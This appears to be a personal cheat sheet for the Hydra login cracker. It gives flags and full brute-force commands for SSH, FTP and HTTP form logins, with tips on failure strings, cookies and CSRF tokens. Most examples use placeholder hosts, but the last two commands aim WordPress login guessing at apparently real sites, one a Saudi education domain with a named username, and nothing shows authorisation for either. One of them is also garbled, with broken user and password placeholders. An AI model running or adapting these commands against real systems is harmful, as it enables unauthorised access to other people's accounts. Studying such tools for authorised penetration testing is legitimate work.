
https://www.kali.org/tools/hydra/

----

Hydra (THC-Hydra) is a fast, parallelized network login cracker used by penetration testers to audit weak credentials across many protocols (`SSH`, `FTP`, `HTTP forms` , `SMB`, `RDP`, etc.).

---

| Flag / Syntax          | Description                                                                                      | Example                                                                                                            |
| ---------------------- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| `-l <user>`            | Single username                                                                                  | `-l root`                                                                                                          |
| `-L <userlist>`        | Username list (file)                                                                             | `-L users.txt`                                                                                                     |
| `-p <pass>`            | Single password                                                                                  | `-p Tr0ub4dor!`                                                                                                    |
| `-P <passlist>`        | Password list (file)                                                                             | `-P passwords.txt`                                                                                                 |
| `-t <threads>`         | Number of parallel threads (speed)                                                               | `-t 8`                                                                                                             |
| `-s <port>`            | Non-standard port                                                                                | `-s 2222`                                                                                                          |
| `-V`                   | Verbose — show attempts                                                                          | `-V`                                                                                                               |
| `-f`                   | Exit after first valid credential found                                                          | `-f`                                                                                                               |
| `-o <file>`            | Write successful logins to file                                                                  | `-o hydra_found.txt`                                                                                               |
| `<service>://<target>` | Target service syntax (e.g. `ssh://10.0.0.5`) — module-specific options apply (HTTP forms, etc.) | `ssh://10.0.0.5` <br>or <br>```<br>http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"<br>``` |

---

# Man page
```sh
man hydra-wizard
```
# Installation
```sh
sudo apt install hydra
```

# SSH (single user, wordlist)
```sh
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 8 ssh://10.0.0.123 -o hydra_ssh_found.txt -f
```

# FTP (user-list + pass-list)
```sh
hydra -L users.txt -P passwords.txt -t 6 ftp://192.168.1.50 -o hydra_ftp.txt
```

# HTTP POST form

Format: `http-post-form '/path:POSTDATA:FAIL_CONDITION'` 
+ Example — target form at `/login.php` where failed logins return text `Login failed` and fields are `username`/`password`
```sh
hydra -L users.txt -P passwords.txt -s 80 example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -t 10 -f
```
`username`/`password` -> names of the form fields come from the HTML input `name` attributes

Lab tutorials show many variants and how to capture the exact POST body with Burp or browser devtools: [here](https://www.oreilly.com/library/view/web-penetration-testing/9781788623377/d2070d87-74d3-4e0f-9cc3-c6154bec5475.xhtml?utm_source=chatgpt.com) .

## Quick checklist before running Hydra.
-  **No dynamic CSRF token or session state that changes per attempt (otherwise use Intruder/script).**

## Build the Hydra `http-post-form` string
Hydra expects this format:
```sh
http-post-form "<path>:<POSTDATA>:<FAILURE_STRING>"
```
- `<path>` — the path part only (**==not domain==**), e.g. `/login.php`
    
- `<POSTDATA>` — exact POST body with `^USER^` and `^PASS^` placeholders where username/password must go; URL-encode if the form sends `application/x-www-form-urlencoded`. Example: `username=^USER^&password=^PASS^&remember=1`
    
- `<FAILURE_STRING>` — an exact substring that appears only on failed logins (Hydra treats that as "still failed"; if you invert logic use success string in some cases)
    
**Example:** 
+ site `example.com` 
+ login at `/login.php` 
+ failure text `Login failed`)
+ input for username it's `name` attribute: `uname`
+ input for password it's name attribute: `password`
```sh
hydra -L users.txt -P passwords.txt example.com http-post-form "/login.php:uname=^USER^&password=^PASS^:Login failed" -t 8 -f -o hydra_http.txt
```

**If the form is at a nonstandard port or requires HTTPS**:
- For HTTPS use `https-post-form` instead of `http-post-form`.
- For nonstandard port include `-s 8443` (or `:8443` in the target URL depending on your hydra version) or append `:port` after the host if required.

## Common gotchas & how to handle them

### CSRF tokens / dynamic hidden fields
If the login requires a token that **changes every session**, Hydra  ==**will fail**==.
If token is static (same value in the form) you can copy it into the POST body.

### Cookies & session state
If a cookie set on initial GET is required for the POST, capture that cookie and include it as a header using `-H` in Hydra:
```sh
hydra -L users.txt -P passwords.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -H "Cookie: sessionid=abc123" ...
```
But if the cookie changes per session, Hydra will fail

### Redirects & success behavior
If successful login redirects elsewhere and the failure page looks the same, use a success indicator instead (a string that appears only on success). 
You can invert logic in your head: if Hydra does not find the failure string it assumes success.

### Exact failure string selection
Use a short but specific substring unique to failed responses.
Avoid dynamic parts like timestamps or session ids.

### Content-Type / JSON APIs
If the app expects JSON (e.g. `{"username":"...","password":"..."}`) Hydra’s `http-post-form` only supports form-style bodies. 
You can try `http-form-post` variants depending on Hydra build, but for JSON endpoints prefer a custom script or use Burp Intruder.

### Rate limiting / account lockout / WAF
Keep `-t` conservative and respect legal scope. 
If you trigger lockouts / WAF, stop and use a safer approach

## Example 

### Simple form (no CSRF, cookie not required)
```sh
hydra -L users.txt -P passwords.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials" -t 6 -f -o hydra_http.txt
```

### Form requires a static hidden `token=abcd1234`
```sh
hydra -L users.txt -P passwords.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^&token=abcd1234:Login failed" -t 6 -o hydra_http.txt
```

### If the server requires a cookie set earlier and the cookie value is stable:
```sh
hydra -L users.txt -P passwords.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -H "Cookie: SESSION=staticvalue" -t 4 -o found.txt
```

```sh
hydra -L ... -P ... zamil.com http-post-form 
"/wp-login.php:log=^^&pwd=^^&wp-submit=دخول&redirect_to=https:zamil.com&testcookie=1:ERROR" -t 4 -o hydra-wp-login.txt
```

```sh
hydra -l "abdullmajeed" -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt manahil.edu.sa http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:خطأ" -t 10 -f -V
```